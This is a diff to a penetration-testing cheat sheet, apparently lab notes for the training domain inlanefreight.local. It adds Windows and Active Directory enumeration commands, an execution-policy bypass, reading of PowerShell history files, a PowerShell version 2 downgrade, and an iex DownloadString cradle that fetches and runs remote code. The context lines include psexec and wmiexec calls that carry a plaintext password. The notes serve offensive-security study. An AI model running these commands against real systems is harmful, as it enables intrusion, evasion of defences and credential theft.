@@ -225,3 +225,69 @@ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
 
 wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
 ```
+
+## Living Off the Land
+```powershell
+hostname
+
+[System.Environment]::OSVersion.Version
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+
+ipconfig /all
+
+set
+
+echo %USERDOMAIN%
+
+echo %logonserver%
+
+systeminfo
+
+sc query windefend
+```
+```powershell
+Get-Module
+
+Get-ExecutionPolicy -List
+
+Set-ExecutionPolicy Bypass -Scope Process
+
+Get-ChildItem Env: | ft Key,Value
+
+Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
+
+powershell.exe -version 2
+
+netsh advfirewall show allprofiles
+
+Get-MpComputerStatus
+
+qwinsta
+
+arp -a
+
+route print
+```
+```powershell
+net group /domain
+
+net user /domain wrouse
+
+net1 user
+```
+```powershell
+dsquery user
+
+dsquery computer
+
+dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+```
